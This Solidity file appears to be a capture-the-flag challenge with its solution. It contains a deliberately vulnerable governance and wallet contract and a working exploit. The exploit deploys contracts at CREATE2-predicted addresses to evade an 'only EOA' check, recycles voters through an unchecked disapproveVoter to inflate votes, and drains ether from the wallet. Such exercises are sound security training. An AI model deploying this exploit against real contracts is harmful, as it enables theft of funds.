// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract OligarchyNFT is ERC721 {
    constructor(address attacker) ERC721("Oligarch", "OG") {
        _mint(attacker, 1);
    }

    function _beforeTokenTransfer(address from, address, uint256, uint256) internal virtual override {
        require(from == address(0), "Cannot transfer nft"); // oligarch cannot transfer the NFT
    }
}

contract Governance {
    IERC721 private immutable oligargyNFT;
    CommunityWallet public immutable communityWallet;
    mapping(uint256 => bool) public idUsed;
    mapping(address => bool) public alreadyVoted;

    struct Appointment {
        //approvedVoters: mapping(address => bool),
        uint256 appointedBy; // oligarchy ids are > 0 so we can use this as a flag
        uint256 numAppointments;
        mapping(address => bool) approvedVoter;
    }

    struct Proposal {
        uint256 votes;
        bytes data;
    }

    mapping(address => Appointment) public viceroys;
    mapping(uint256 => Proposal) public proposals;

    constructor(ERC721 _oligarchyNFT) payable {
        oligargyNFT = _oligarchyNFT;
        communityWallet = new CommunityWallet{value: msg.value}(address(this));
    }

    /*
     * @dev an oligarch can appoint a viceroy if they have an NFT
     * @param viceroy: the address who will be able to appoint voters
     * @param id: the NFT of the oligarch
     */
    function appointViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(!idUsed[id], "already appointed a viceroy");
        require(viceroy.code.length == 0, "only EOA");

        idUsed[id] = true;
        viceroys[viceroy].appointedBy = id;
        viceroys[viceroy].numAppointments = 5;
    }

    function deposeViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(viceroys[viceroy].appointedBy == id, "only the appointer can depose");

        idUsed[id] = false;
        delete viceroys[viceroy];
    }

    function approveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(voter != msg.sender, "cannot add yourself");
        require(!viceroys[msg.sender].approvedVoter[voter], "cannot add same voter twice");
        require(viceroys[msg.sender].numAppointments > 0, "no more appointments");
        require(voter.code.length == 0, "only EOA");

        viceroys[msg.sender].numAppointments -= 1;
        viceroys[msg.sender].approvedVoter[voter] = true;
    }

    function disapproveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(viceroys[msg.sender].approvedVoter[voter], "cannot disapprove an unapproved address");
        viceroys[msg.sender].numAppointments += 1;
        delete viceroys[msg.sender].approvedVoter[voter];
    }

    function createProposal(address viceroy, bytes calldata proposal) external {
        require(
            viceroys[msg.sender].appointedBy != 0 || viceroys[viceroy].approvedVoter[msg.sender],
            "sender not a viceroy or voter"
        );

        uint256 proposalId = uint256(keccak256(proposal));
        proposals[proposalId].data = proposal;
    }

    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
        require(proposals[proposal].data.length != 0, "proposal not found");
        require(viceroys[viceroy].approvedVoter[msg.sender], "Not an approved voter");
        require(!alreadyVoted[msg.sender], "Already voted");
        if (inFavor) {
            proposals[proposal].votes += 1;
        }
        alreadyVoted[msg.sender] = true;
    }

    function executeProposal(uint256 proposal) external {
        require(proposals[proposal].votes >= 10, "Not enough votes");
        (bool res, ) = address(communityWallet).call(proposals[proposal].data);
        require(res, "call failed");
    }
}

contract CommunityWallet {
    address public governance;

    constructor(address _governance) payable {
        governance = _governance;
    }

    function exec(address target, bytes calldata data, uint256 value) external {
        require(msg.sender == governance, "Caller is not governance contract");
        (bool res, ) = target.call{value: value}(data);
        require(res, "call failed");
    }

    fallback() external payable {}
}


/**
 * *****************************   add your exploiter contract below   ***************************
 */
contract ExploitContract {
    using Create2Address for address;

    /**
     * Voting can be exploited because `disapproveVoter()` does not check whether the voter has
     * voted or not. That means, a voter can vote on a proposal, then viceroy can disapprove the voter
     * and add new a new voter leading to more votes than initially assigned (5).
     */
    function exploit(Governance governance) public {
        address viceroyAddress = address(this).predictAddress(
            bytes32(hex'1729'),
            type(ViceroyAsEOA).creationCode,
            abi.encode(address(governance))
        );
        // Since viceroy.code.length == 0, appoint the viceroy first and then deploy the contract to it
        governance.appointViceroy(viceroyAddress, 1);

        // deploy contract at viceroyAddress address and then appoint voters inside its constructor
        new ViceroyAsEOA{salt: bytes32(hex'1729')}(governance);
    }

    receive() external payable { } 
}

contract ViceroyAsEOA {
    using Create2Address for address;

    constructor(Governance governance) {
        // create a proposal to transfer ether by calling `exec` on CommunityWallet
        bytes memory proposalData = abi.encodeWithSignature("exec(address,bytes,uint256)", msg.sender, "", 1 ether);
        uint256 proposalId = uint256(keccak256(proposalData));
        governance.createProposal(address(this), proposalData);

        for (uint i; i < 10; ++i) {
            address voterAddress = address(this).predictAddress(
                bytes32(uint256(i)),
                type(VoterAsEOA).creationCode,
                abi.encode(address(governance), proposalId)
            );
            // since voter.code.length == 0, appoint the voter first and then deploy the contract to it
            governance.approveVoter(voterAddress);

            // deploy voter and vote inside its constructor
            new VoterAsEOA{salt: bytes32(uint256(i))}(governance, proposalId);

            // disapprove voter
            governance.disapproveVoter(voterAddress);
        }

        // execute proposal
        governance.executeProposal(proposalId);
    }
}

contract VoterAsEOA {
    constructor(Governance governance, uint256 proposalId) {
        // vote on proposal
        governance.voteOnProposal(proposalId, true, msg.sender);
    }
}

library Create2Address {
    function predictAddress(
        address deployer,
        bytes32 salt,
        bytes memory creationCode,
        bytes calldata encodedArgs
    ) public pure returns (address predictedAddress) {
        predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xff),
            deployer,
            salt,
            keccak256(abi.encodePacked(
                creationCode,
                encodedArgs
            ))
        )))));
    }
}